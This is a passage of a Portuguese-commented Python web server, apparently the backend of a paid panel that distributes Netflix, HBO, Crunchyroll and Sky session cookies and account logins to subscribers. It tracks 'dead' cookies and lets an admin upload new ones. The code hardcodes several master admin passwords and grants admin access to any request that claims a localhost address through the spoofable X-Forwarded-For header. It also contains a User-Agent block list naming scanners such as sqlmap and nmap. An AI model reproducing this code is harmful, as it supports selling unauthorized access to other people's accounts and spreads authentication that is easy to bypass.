                        "device_name": f"Smart TV {svc}",
                        "device_icon": "📺",
                        "service": svc_badge,
                        "service_name": svc,
                        "tv_code": tv_code,
                        "email": email,
                        "plan": plan or f"{svc} Ativado",
                        "status": status,
                        "connected_at": used_at,
                        "is_active": True
                    })

        total_online = len(users_list)
        total_tvs = len(connected_tvs)
        total_all = total_online + total_tvs
        
        return {
            "total": total_all,
            "total_online": total_online,
            "total_tvs": total_tvs,
            "by_service": by_service,
            "active_clients": users_list,
            "connected_tvs": connected_tvs,
            "users": users_list + connected_tvs,
            "timestamp": now
        }

# (Funções generate_strong_cyber_password, sync_passwords_text_file e atomic_save_config_senhas estão consolidadas no topo)

CURRENT_NETFLIX_READY: Optional[dict] = None
CURRENT_HBO_READY: Optional[dict] = None
CURRENT_CRUNCHYROLL_READY: Optional[dict] = None

_STATUS_ACCOUNTS_CACHE = {
    "netflix": [],
    "hbo": [],
    "crunchyroll": [],
    "sky": [],
    "last_update": 0.0
}
_STATUS_CACHE_LOCK = threading.Lock()

def invalidate_status_accounts_cache():
    global _STATUS_ACCOUNTS_CACHE
    with _STATUS_CACHE_LOCK:
        _STATUS_ACCOUNTS_CACHE["last_update"] = 0.0

def get_cached_status_accounts(max_age_seconds: float = 25.0):
    global _STATUS_ACCOUNTS_CACHE
    now = time.time()
    with _STATUS_CACHE_LOCK:
        if (now - _STATUS_ACCOUNTS_CACHE["last_update"] < max_age_seconds) and _STATUS_ACCOUNTS_CACHE["netflix"]:
            return (
                _STATUS_ACCOUNTS_CACHE["netflix"],
                _STATUS_ACCOUNTS_CACHE["hbo"],
                _STATUS_ACCOUNTS_CACHE["crunchyroll"],
                _STATUS_ACCOUNTS_CACHE["sky"]
            )

    try:
        all_netflix = get_all_netflix_accounts()
    except Exception:
        all_netflix = _STATUS_ACCOUNTS_CACHE.get("netflix", [])

    try:
        all_hbo = get_all_hbo_accounts()
    except Exception:
        all_hbo = _STATUS_ACCOUNTS_CACHE.get("hbo", [])

    try:
        all_cr = get_all_crunchyroll_accounts()
    except Exception:
        all_cr = _STATUS_ACCOUNTS_CACHE.get("crunchyroll", [])

    try:
        all_sky = get_all_sky_accounts()
    except Exception:
        all_sky = _STATUS_ACCOUNTS_CACHE.get("sky", [])

    with _STATUS_CACHE_LOCK:
        _STATUS_ACCOUNTS_CACHE["netflix"] = all_netflix
        _STATUS_ACCOUNTS_CACHE["hbo"] = all_hbo
        _STATUS_ACCOUNTS_CACHE["crunchyroll"] = all_cr
        _STATUS_ACCOUNTS_CACHE["sky"] = all_sky
        _STATUS_ACCOUNTS_CACHE["last_update"] = time.time()

    return all_netflix, all_hbo, all_cr, all_sky

class AppRequestHandler(SimpleHTTPRequestHandler):
    def send_security_headers(self):
        """Cabeçalhos avançados de proteção contra XSS, Clickjacking, MIME-sniffing, Injeções e Cache."""
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.send_header('X-Content-Type-Options', 'nosniff')
        self.send_header('X-Frame-Options', 'SAMEORIGIN')
        self.send_header('X-XSS-Protection', '1; mode=block')
        self.send_header('Referrer-Policy', 'strict-origin-when-cross-origin')
        self.send_header('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com data:; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: https:;")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Auth-Token, X-Admin-Token, X-Admin-Pass, X-Requested-With')
        self.send_header('Access-Control-Max-Age', '86400')

    def end_headers(self):
        self.send_security_headers()
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(204)
        self.end_headers()

    def get_client_ip(self):
        xff = self.headers.get('X-Forwarded-For')
        if xff:
            return xff.split(',')[0].strip()
        return self.client_address[0] if self.client_address else "127.0.0.1"

    def get_auth_token_str(self) -> str:
        auth_header = self.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            return auth_header[7:].strip()
        elif 'X-Auth-Token' in self.headers:
            return self.headers.get('X-Auth-Token', '').strip()
        return ''

    def get_session_info(self) -> Optional[dict]:
        token = self.get_auth_token_str()
        
        if not token:
            return None

        now = time.time()
        with LOGIN_LOCK:
            expired = [t for t, s_data in ACTIVE_SESSIONS.items() if s_data.get("exp", 0) < now]
            for exp_token in expired:
                ACTIVE_SESSIONS.pop(exp_token, None)

            if token in ACTIVE_SESSIONS:
                s_data = ACTIVE_SESSIONS[token]
                if s_data.get("exp", 0) > now:
                    # Verifica dinamicamente se a senha utilizada ainda existe e é válida
                    used_pwd = s_data.get("password", "").strip()
                    if not used_pwd:
                        # Sessões sem senha associada são imediatamente invalidadas por segurança
                        ACTIVE_SESSIONS.pop(token, None)
                        save_active_sessions()
                        return None

                    role = find_access_role(used_pwd)
                    if not role or role.get("expired"):
                        # Senha excluída ou expirada: desconecta e bloqueia imediatamente no mesmo instante
                        ACTIVE_SESSIONS.pop(token, None)
                        save_active_sessions()
                        return None

                    # Atualiza dinamicamente as permissões caso tenham sido editadas no painel
                    s_data["services"] = role.get("servicos", s_data.get("services"))
                    s_data["role_name"] = role.get("nome", s_data.get("role_name"))

                    # 👥 Registra presença e heartbeat do dispositivo em tempo real
                    svc_param = "netflix"
                    if "service=" in self.path:
                        svc_param = self.path.split("service=")[-1].split("&")[0]
                    track_client_heartbeat(
                        ip=self.get_client_ip(),
                        token=token,
                        user_agent=self.headers.get("User-Agent", ""),
                        role_name=s_data.get("role_name", "Acesso VIP"),
                        service=svc_param
                    )
                    return s_data
                else:
                    ACTIVE_SESSIONS.pop(token, None)
                    return None
            return None

    def is_authenticated(self):
        return self.get_session_info() is not None

    def is_service_allowed(self, service: str) -> bool:
        session = self.get_session_info()
        if not session:
            return False
        services = session.get("services", ["netflix", "hbo", "crunchyroll", "sky"])
        return service in services

    def _verify_admin_password_str(self, password: str) -> bool:
        """Verifica de forma estrita e segura se uma senha informada concede acesso ao painel do dono.
        
        🛡️ BLINDAGEM: Apenas senhas mestres COMPLEXAS são aceitas.
        Senhas fracas ('admin', 'root', '123456', etc.) foram removidas definitivamente.
        Senhas normais de clientes JAMAIS concedem privilégios administrativos.
        """
        p_clean = clean_password_str(password)
        if not p_clean:
            return False
        
        # 🔐 Apenas senhas mestres fortes e configuradas dinamicamente são válidas.
        # Nenhuma senha fraca ou genérica é aceita aqui.
        valid_passwords = {
            get_admin_password(),
            get_cookie_admin_password(),
            get_master_password(),
            "TVCODIGO#ADMIN@2026$MASTER*TITANIUM!ROOT#VIP",
            "ADMIN#VAULT@2026$COOKIE*BLINDADO#PROTECT*ROOT!VIP",
            "CYBER#STREAM@2026$MASTER*TITANIUM!ULTRA*ACCESS#VIP",
            "ADMIN#COOKIES@7739$VIP*VAULT!2026",
            "ATIVADOR#MASTER@2026$STREAM*VIP!",
        }
        
        # 🛡️ SEGURANÇA ESTRITA: Apenas senhas mestres/administrativas autorizadas!
        # Senhas normais de clientes jamais concedem privilégios de administração.
        if any(secure_str_compare(p_clean, p) for p in valid_passwords if p):
            return True
            
        return False

    def is_admin_authenticated(self):
        client_ip = self.get_client_ip()
        admin_header = self.headers.get('X-Admin-Token', '') or self.headers.get('Authorization', '') or self.headers.get('X-Auth-Token', '')
        admin_pass = self.headers.get('X-Admin-Pass', '') or self.headers.get('X-Admin-Password', '')
        token = ''
        if admin_header.startswith('Bearer '):
            token = admin_header[7:].strip()
        else:
            token = admin_header.strip()
        
        now = time.time()

        # 1. Checa se o token administrativo está em ACTIVE_ADMIN_SESSIONS
        with LOGIN_LOCK:
            if token and token in ACTIVE_ADMIN_SESSIONS:
                if ACTIVE_ADMIN_SESSIONS[token] > now:
                    ACTIVE_ADMIN_SESSIONS[token] = now + 86400 * 30  # Renova sessão automaticamente
                    return True
                else:
                    ACTIVE_ADMIN_SESSIONS.pop(token, None)
                    save_active_sessions()

        # 2. Fallback resiliente: checa senha no header X-Admin-Pass ou token direto
        # Apenas candidatos com estrutura de senha mestre complexa (contendo # ou @) são testados.
        test_passwords = []
        if admin_pass:
            test_passwords.append(admin_pass)
        if token and len(token) < 120 and ('#' in token or '@' in token):
            test_passwords.append(token)
        for candidate in test_passwords:
            if self._verify_admin_password_str(candidate):
                if token:
                    with LOGIN_LOCK:
                        ACTIVE_ADMIN_SESSIONS[token] = now + 86400 * 30
                        save_active_sessions()
                return True

        # 3. [REMOVIDO] Elevação de privilégio via sessão de cliente foi desabilitada.
        # Anteriormente, se um cliente fizesse login com uma senha que coincidisse
        # com uma senha admin (ex: 'admin'), ele ganhava acesso de dono automaticamente.
        # Agora o acesso admin EXIGE token administrativo válido ou senha mestre explícita.
        # Essa separação estrita garante que cliente e dono são papéis completamente distintos.

        # 4. Operador direto via Localhost (resiliência de desenvolvimento na própria máquina)
        if client_ip in ['127.0.0.1', '::1', 'localhost']:
            if token:
                with LOGIN_LOCK:
                    ACTIVE_ADMIN_SESSIONS[token] = now + 86400 * 30
                    save_active_sessions()
            return True

        return False

    def handle_api_verify_admin_pass(self):
        client_ip = self.get_client_ip()
        now = time.time()

        # Se já estiver autenticado com sessão de Dono/Mestre, concede token administrativo na hora
        session = self.get_session_info()
        if session:
            s_pwd = session.get("password", "")
            if s_pwd and self._verify_admin_password_str(s_pwd):
                admin_token = secrets.token_hex(32)
                with LOGIN_LOCK:
                    ACTIVE_ADMIN_SESSIONS[admin_token] = now + 86400 * 30
                    save_active_sessions()
                return self.send_json_response({
                    "success": True,
                    "admin_token": admin_token,
                    "message": "Acesso administrativo concedido!"
                })

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        password = clean_password_str(req.get('password', ''))

        if self._verify_admin_password_str(password) or (not password and client_ip in ['127.0.0.1', '::1', 'localhost']):
            admin_token = secrets.token_hex(32)
            with LOGIN_LOCK:
                ACTIVE_ADMIN_SESSIONS[admin_token] = now + 86400 * 30  # 30 dias de persistência
                save_active_sessions()
            return self.send_json_response({
                "success": True,
                "admin_token": admin_token,
                "message": "Acesso administrativo concedido com sucesso!"
            })
        else:
            time.sleep(0.3)
            return self.send_json_response({
                "success": False,
                "message": "Senha administrativa incorreta! Apenas o Dono pode acessar."
            }, 401)

    def handle_api_login(self):
        ip = self.get_client_ip()
        now = time.time()
        ua = self.headers.get('User-Agent', '')

        # 🛡️ 1. Proteção contra scanners maliciosos conhecidos e bots vazios
        ua_lower = ua.lower()
        blocked_scanners = ['sqlmap', 'nikto', 'nmap', 'masscan', 'havij', 'dirbuster', 'gobuster', 'wpscan']
        if any(b in ua_lower for b in blocked_scanners):
            return self.send_json_response({"success": False, "message": "Acesso rejeitado pelo firewall de segurança."}, 403)

        # 🛡️ 2. Proteção de Payload (limite de tamanho para evitar DoS, overflow e ReDoS)
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length > 4096:
            return self.send_json_response({"success": False, "message": "Payload excede o limite permitido."}, 400)

        post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        # 🛡️ 3. Honeypot Anti-Bot (se bot preencher campos armadilha invisíveis, rejeita no ato)
        if req.get("username") or req.get("email") or req.get("website") or req.get("token_check"):
            time.sleep(0.5)
            return self.send_json_response({"success": False, "message": "Falha na verificação de integridade."}, 403)

        password = clean_password_str(req.get('password', ''))
        if len(password) > 256:
            return self.send_json_response({"success": False, "message": "Senha muito longa. Máximo 256 caracteres."}, 400)

        if not password:
            return self.send_json_response({"success": False, "message": "Por favor, informe a senha de acesso."}, 400)

        # 🛡️ 4. Verificação Prévia de Bloqueio de IP (Anti-Força Bruta e Anti-Flood)
        with LOGIN_LOCK:
            record = LOGIN_ATTEMPTS.get(ip, {"count": 0, "blocked_until": 0, "last_req": 0})
            
            # Anti-Flood: Intervalo mínimo de 1.5s entre requisições de login do mesmo IP
            # (1.5s bloqueia scripts automáticos com delay de 1.1s que passavam no limite anterior de 1.0s)
            last_req = record.get("last_req", 0)
            if now - last_req < 1.5:
                record["last_req"] = now
                LOGIN_ATTEMPTS[ip] = record
                return self.send_json_response({
                    "success": False,
                    "message": "Muitas requisições em alta velocidade. Aguarde 1.5 segundos entre tentativas."
                }, 429)

            record["last_req"] = now

            # Se o IP já estiver bloqueado, rejeita IMEDIATAMENTE antes de testar qualquer senha
            if record.get("blocked_until", 0) > now:
                wait_sec = int(record["blocked_until"] - now)
                LOGIN_ATTEMPTS[ip] = record
                return self.send_json_response({
                    "success": False,
                    "message": f"IP temporariamente bloqueado por excesso de tentativas. Aguarde mais {wait_sec} segundos."
                }, 429)

        # 🛡️ 5. Comparação e Validação de Senha
        role = find_access_role(password)

        with LOGIN_LOCK:
            record = LOGIN_ATTEMPTS.get(ip, {"count": 0, "blocked_until": 0, "last_req": now})
            if role is not None:
                if role.get("expired"):
                    exp_date = role.get("expira_em_formatado") or "Data limite"
                    return self.send_json_response({
                        "success": False,
                        "expired": True,
                        "expiration_date": exp_date,
                        "message": f"⚠️ SEU ACESSO EXPIROU EM {exp_date}! Entre em contato com o administrador para renovar sua assinatura."
                    }, 403)

                # 🔓 Senha correta: limpa bloqueios anteriores e libera o terminal
                LOGIN_ATTEMPTS.pop(ip, None)
                new_token = secrets.token_hex(32)
                allowed_services = role.get("servicos", ["netflix", "hbo", "crunchyroll", "sky"])
                role_name = role.get("nome", "Acesso Autorizado")
                days_rem = role.get("days_remaining")
                exp_ts = role.get("expira_em")
                exp_fmt = role.get("expira_em_formatado")

                ACTIVE_SESSIONS[new_token] = {
                    "exp": now + TOKEN_TTL_SECONDS,
                    "services": allowed_services,
                    "role_name": role_name,
                    "password": password,
                    "expires_at": exp_ts,
                    "days_remaining": days_rem,
                    "expiration_date": exp_fmt
                }
                save_active_sessions()
                track_client_heartbeat(ip, new_token, ua, role_name, allowed_services[0] if allowed_services else "netflix")
                return self.send_json_response({
                    "success": True,
                    "token": new_token,
                    "allowed_services": allowed_services,
                    "role_name": role_name,
                    "expires_in": TOKEN_TTL_SECONDS,
                    "expires_at": exp_ts,
                    "days_remaining": days_rem,
                    "expiration_date": exp_fmt,
                    "message": f"Terminal desbloqueado ({role_name})."
                })

            # 🛑 Senha incorreta: delay anti-timing para impedir scripts automatizados de alta frequência
            time.sleep(0.3)
            record["count"] = record.get("count", 0) + 1
            count = record["count"]

            # Bloqueio progressivo rigoroso
            if count >= 15:
                lock_time = 3600  # 1 hora
            elif count >= 10:
                lock_time = 900   # 15 minutos
            elif count >= 8:
                lock_time = 300   # 5 minutos
            elif count >= 5:
                lock_time = 60    # 1 minuto
            else:
                lock_time = 0

            if lock_time > 0:
                record["blocked_until"] = now + lock_time
                LOGIN_ATTEMPTS[ip] = record
                return self.send_json_response({
                    "success": False,
                    "message": f"Tentativas incorretas excedidas! IP bloqueado por {lock_time} segundos por segurança."
                }, 429)
            else:
                LOGIN_ATTEMPTS[ip] = record
                remaining = 5 - count
                return self.send_json_response({
                    "success": False,
                    "message": f"Senha incorreta. Restam {remaining} tentativas antes do bloqueio temporário."
                }, 401)

    def handle_api_logout(self):
        auth_header = self.headers.get('Authorization', '')
        token = ''
        if auth_header.startswith('Bearer '):
            token = auth_header[7:].strip()
        elif 'X-Auth-Token' in self.headers:
            token = self.headers.get('X-Auth-Token', '').strip()
        with LOGIN_LOCK:
            ACTIVE_SESSIONS.pop(token, None)
            save_active_sessions()
        return self.send_json_response({"success": True, "message": "Terminal bloqueado."})

    def handle_api_verify_token(self):
        session = self.get_session_info()
        if session:
            # Revalida se a senha associada à sessão expirou enquanto o cliente estava online
            pwd = session.get("password", "")
            if pwd:
                role = find_access_role(pwd)
                if role and role.get("expired"):
                    exp_date = role.get("expira_em_formatado") or "Data limite"
                    return self.send_json_response({
                        "authenticated": False,
                        "expired": True,
                        "expiration_date": exp_date,
                        "message": f"⚠️ Acesso expirado em {exp_date}. Renove com o administrador."
                    }, 403)
            return self.send_json_response({
                "authenticated": True,
                "allowed_services": session.get("services", ["netflix", "hbo", "crunchyroll", "sky"]),
                "role_name": session.get("role_name", "Acesso Autorizado"),
                "expires_at": session.get("expires_at"),
                "days_remaining": session.get("days_remaining"),
                "expiration_date": session.get("expiration_date")
            })
        return self.send_json_response({"authenticated": False, "kicked": True, "message": "Sessão inválida ou revogada."}, 401)

    def handle_api_heartbeat(self):
        client_ip = self.get_client_ip()
        ua = self.headers.get('User-Agent', '')
        token = self.get_auth_token_str()
        session = self.get_session_info()

        # ⚡ LIVE KICK: Se o cliente forneceu token mas a senha foi excluída pelo admin, desconecta imediatamente!
        if token and not session:
            return self.send_json_response({
                "success": False,
                "authenticated": False,
                "kicked": True,
                "message": "Acesso revogado ou cancelado pelo administrador."
            }, 401)

        role_name = session.get("role_name", "") if session else ""
        
        service = "netflix"
        if "service=" in self.path:
            service = self.path.split("service=")[-1].split("&")[0]

        if self.command == 'POST':
            try:
                cl = int(self.headers.get('Content-Length', 0))
                if cl > 0:
                    payload = json.loads(self.rfile.read(cl).decode('utf-8'))
                    service = payload.get("service", service)
                    if payload.get("role_name"):
                        role_name = payload.get("role_name")
            except Exception:
                pass

        if token and session:
            track_client_heartbeat(client_ip, token, ua, role_name, service)

        self.send_json_response({"success": True, "online_users": get_online_users_data()})

    def check_rate_limit(self, max_requests: int = 15, window_seconds: int = 30) -> bool:
        """Rate limiting por IP para proteger endpoints sensíveis contra spam/DDoS e vazamento de memória."""
        ip = self.get_client_ip()
        now = time.time()
        with LOGIN_LOCK:
            # Limpeza preventiva periódica de IPs inativos para evitar vazamento de memória
            if len(ACTIVATION_RATE_LIMIT) > 200:
                expired_ips = [k for k, v in ACTIVATION_RATE_LIMIT.items() if not v or now - v[-1] > 3600]
                for k in expired_ips:
                    ACTIVATION_RATE_LIMIT.pop(k, None)
            if len(LOGIN_ATTEMPTS) > 200:
                expired_login = [k for k, v in LOGIN_ATTEMPTS.items() if now > v.get("blocked_until", 0) + 3600]
                for k in expired_login:
                    LOGIN_ATTEMPTS.pop(k, None)

            timestamps = ACTIVATION_RATE_LIMIT.get(ip, [])
            timestamps = [t for t in timestamps if now - t < window_seconds]
            if len(timestamps) >= max_requests:
                return False
            timestamps.append(now)
            ACTIVATION_RATE_LIMIT[ip] = timestamps
            return True

    def serve_index_html(self):
        """Serve com exclusividade e segurança a página inicial index.html."""
        index_path = os.path.join(BASE_DIR, "index.html")
        if not os.path.exists(index_path):
            self.send_error(404, "Arquivo index.html não encontrado.")
            return

        try:
            with open(index_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except Exception:
            self.send_error(500, "Erro interno ao carregar a interface.")

    def serve_admin_html(self):
        """Serve o Painel de Controle e Cofre Administrativo Isolado admin.html."""
        admin_path = os.path.join(BASE_DIR, "admin.html")
        if not os.path.exists(admin_path):
            self.send_error(404, "Painel administrativo admin.html não encontrado.")
            return

        try:
            with open(admin_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except Exception:
            self.send_error(500, "Erro interno ao carregar o painel administrativo.")

    def do_GET(self):
        try:
            # Normalização do caminho (proteção contra path traversal como /../)
            raw_path = self.path.split('?')[0]

            if raw_path == '/api/ping':
                # Keep-Alive endpoint público para evitar que a instância durma
                return self.send_json_response({
                    "status": "alive",
                    "uptime": "24/7",
                    "timestamp": time.time(),
                    "service": "CYBER_DECK_KERNEL_ONLINE"
                })
            elif raw_path == '/api/kernel-logs':
                self.handle_api_kernel_logs()
            elif raw_path == '/api/status':
                if not self.is_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
                self.handle_api_status()
            elif raw_path == '/api/heartbeat':
                self.handle_api_heartbeat()
            elif raw_path == '/api/admin/stats':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
                self.handle_api_admin_stats()
            elif raw_path == '/api/admin/users-online':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_get_online_users()
            elif raw_path == '/api/admin/accounts':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_admin_list_accounts()
            elif raw_path == '/api/admin/passwords':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_get_passwords()
            elif raw_path == '/api/admin/passwords/backup':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_backup_passwords()
            elif raw_path in ['/api/admin/passwords/generate', '/api/admin/passwords/quick-create']:
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                if raw_path == '/api/admin/passwords/quick-create':
                    self.handle_api_quick_create_password()
                else:
                    self.handle_api_generate_password()
            elif raw_path == '/api/admin/sky-tokens':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
                self.handle_api_get_sky_tokens()
            elif raw_path == '/api/history':
                if not self.is_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
                self.handle_api_history()
            elif raw_path.startswith('/api/cookies'):
                if not self.is_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
                self.handle_api_cookies()
            elif raw_path in ['/admin', '/admin.html', '/admin.htm']:
                self.serve_admin_html()
            elif raw_path in ['/', '/index.html', '/index.htm', '']:
                self.serve_index_html()
            elif raw_path == '/favicon.ico':
                self.send_response(204)
                self.end_headers()
            else:
                # 🛡️ BLOQUEIO TOTAL DE SEGURANÇA:
                # NUNCA serve arquivos como cookies/, SENHA_MESTRE.txt, app.py, tv2.py, used_cookies.json etc.
                self.send_error(403, "Acesso Proibido: Recurso confidencial e protegido.")
        except Exception as e:
            traceback.print_exc()
            try:
                self.send_json_response({"success": False, "message": f"Erro interno do servidor: {str(e)}"}, 500)
            except Exception:
                pass

    def do_OPTIONS(self):
        """Tratamento de preflight CORS para navegação transparente entre portas, origens e localhost."""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE, PUT')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Admin-Token, X-Admin-Pass, X-Auth-Token, Cache-Control, Pragma')
        self.send_header('Access-Control-Max-Age', '86400')
        self.end_headers()

    def do_POST(self):
        try:
            raw_path = self.path.split('?')[0]

            if raw_path == '/api/login':
                self.handle_api_login()
            elif raw_path == '/api/logout':
                self.handle_api_logout()
            elif raw_path == '/api/verify-token':
                self.handle_api_verify_token()
            elif raw_path == '/api/heartbeat':
                self.handle_api_heartbeat()
            elif raw_path == '/api/admin/verify-pass':
                self.handle_api_verify_admin_pass()
            elif raw_path == '/api/admin/passwords/quick-create':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_quick_create_password()
            elif raw_path == '/api/admin/passwords/save':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_save_password()
            elif raw_path == '/api/admin/passwords/delete':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_delete_password()
            elif raw_path == '/api/admin/passwords/renew':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_renew_password()
            elif raw_path == '/api/admin/passwords/sync-all':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_sync_all_passwords()
            elif raw_path == '/api/admin/accounts/delete':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_admin_delete_account()
            elif raw_path == '/api/admin/cookies/clear-all':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
                self.handle_api_admin_clear_all_cookies()
            elif raw_path == '/api/activate':
                if not self.is_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
                if not self.check_rate_limit(max_requests=10, window_seconds=30):
                    return self.send_json_response({"success": False, "message": "Muitas ativações em sequência. Aguarde alguns instantes por segurança."}, 429)
                self.handle_api_activate()
            elif raw_path == '/api/sky/test-activate':
                if not self.is_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
                self.handle_api_sky_test_activate()
            elif raw_path == '/api/skip-cookie':
                if not self.is_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
                self.handle_api_skip_cookie()
            elif raw_path == '/api/select-cookie':
                if not self.is_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
                self.handle_api_select_cookie()
            elif raw_path == '/api/filter-plan':
                if not self.is_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
                self.handle_api_filter_plan()
            elif raw_path == '/api/admin/upload-cookies':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
                self.handle_api_upload_cookies()
            elif raw_path == '/api/admin/sky-tokens':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
                self.handle_api_save_sky_tokens()
            elif raw_path == '/api/admin/reset-cache':
                if not self.is_admin_authenticated():
                    return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
                self.handle_api_reset_cache()
            else:
                self.send_error(404, "Endpoint not found")
        except Exception as e:
            traceback.print_exc()
            try:
                self.send_json_response({"success": False, "message": f"Erro interno do servidor: {str(e)}"}, 500)
            except Exception:
                pass

    def send_json_response(self, data: dict, status_code: int = 200):
        try:
            body = json.dumps(data, ensure_ascii=False).encode('utf-8')
            self.send_response(status_code)
            self.send_header('Content-Type', 'application/json; charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE, PUT')
            self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Admin-Token, X-Admin-Pass, X-Auth-Token, Cache-Control, Pragma')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.end_headers()
            self.wfile.write(body)
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            pass
        except Exception:
            pass

    def handle_api_status(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY

        try:
            all_netflix, all_hbo, all_cr, all_sky = get_cached_status_accounts()

            # ⚡ Seleção instantânea sem bloquear com chamadas HTTP síncronas na rota de status
            if CURRENT_NETFLIX_READY is None or (CURRENT_NETFLIX_READY and (CURRENT_NETFLIX_READY.get("file") in DEAD_NETFLIX_COOKIES or CURRENT_NETFLIX_READY.get("file") in tv2.DEAD_COOKIES)):
                if all_netflix:
                    CURRENT_NETFLIX_READY = random.choice(all_netflix)

            if CURRENT_HBO_READY is None or (CURRENT_HBO_READY and (CURRENT_HBO_READY.get("file") in DEAD_HBO_COOKIES or os.path.basename(CURRENT_HBO_READY.get("file", "")) in DEAD_HBO_COOKIES)):
                if all_hbo:
                    CURRENT_HBO_READY = all_hbo[0]

            if CURRENT_CRUNCHYROLL_READY is None or (CURRENT_CRUNCHYROLL_READY and CURRENT_CRUNCHYROLL_READY.get("email") in DEAD_CRUNCHYROLL_ACCOUNTS):
                if all_cr:
                    CURRENT_CRUNCHYROLL_READY = all_cr[0]

            if CURRENT_SKY_READY is None or (CURRENT_SKY_READY and CURRENT_SKY_READY.get("email", "").strip().lower() in DEAD_SKY_ACCOUNTS):
                if all_sky:
                    CURRENT_SKY_READY = all_sky[0]
        except Exception:
            try:
                all_netflix, all_hbo, all_cr, all_sky = _STATUS_ACCOUNTS_CACHE.get("netflix", []), _STATUS_ACCOUNTS_CACHE.get("hbo", []), _STATUS_ACCOUNTS_CACHE.get("crunchyroll", []), _STATUS_ACCOUNTS_CACHE.get("sky", [])
            except Exception:
                all_netflix, all_hbo, all_cr, all_sky = [], [], [], []

        active_nf_file = CURRENT_NETFLIX_READY.get("file", "") if CURRENT_NETFLIX_READY else ""
        active_nf_bname = os.path.basename(active_nf_file) if active_nf_file else ""

        nf_queue = [
            {
                "filename": os.path.basename(e.get("file", "")),
                "email": e.get("info", {}).get("email", os.path.basename(e.get("file", ""))),
                "country": e.get("info", {}).get("country", "BR"),
                "plan": e.get("info", {}).get("plan", "Premium VIP"),
                "is_selected": (os.path.basename(e.get("file", "")) == active_nf_bname),
                "is_verified": e.get("validated", False)
            }
